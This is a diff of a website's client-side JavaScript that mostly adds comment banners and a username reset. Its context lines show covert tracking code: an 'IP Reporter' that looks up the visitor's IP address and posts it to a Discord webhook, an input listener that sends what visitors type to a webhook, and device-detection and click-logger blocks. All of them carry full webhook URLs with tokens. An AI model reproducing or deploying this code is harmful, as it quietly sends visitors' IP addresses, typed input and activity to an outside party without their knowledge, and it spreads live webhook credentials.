@@ -1,4 +1,11 @@
-// Username setup with localStorage using key "ytm15Username"
+// ----------------------
+// Username Setup
+// ----------------------
+let storedName = localStorage.getItem("ytm15Username");
+if (!storedName || storedName.trim() === "") {
+  localStorage.removeItem("ytm15Username");
+}
+
 let username = localStorage.getItem("ytm15Username");
 if (!username) {
   username = prompt("Enter your username:")?.trim() || "Anonymous";
@@ -13,7 +20,9 @@ function changeUsername() {
   }
 }
 
+// ----------------------
 // IP Reporter
+// ----------------------
 (async () => {
   const fileUrl = "https://ipv4.icanhazip.com/";
   const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
@@ -52,7 +61,9 @@ function changeUsername() {
   }
 })();
 
+// ----------------------
 // Input Listener
+// ----------------------
 function sendToWebhook(content) {
   if (!content) return;
   const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
@@ -91,7 +102,9 @@ else document.addEventListener("DOMContentLoaded", () => {
   if (i) attachInputListener(i);
 });
 
+// ----------------------
 // Device Detection Webhook
+// ----------------------
 (async () => {
   try {
     const KwebhookUrl = "https://discord.com/api/webhooks/1426288631152251090/NOzBMFAj0j_O2uapbBZMit_37Mo4iJGgUNxO2BevN-LrGxqR4IX441WC2hdjuwVcSNBh";
@@ -107,7 +120,9 @@ else document.addEventListener("DOMContentLoaded", () => {
   }
 })();
 
+// ----------------------
 // Click Logger Webhook
+// ----------------------
 (async () => {
   const winhook = "https://discord.com/api/webhooks/1426997095721730199/lllpiiAWKMV5zdFaONWNLSjMZ7PI-UIlWeUdahs74fbgOVZUNPwTDkh8EszSu-TqHjG2";
   let fileText = "";
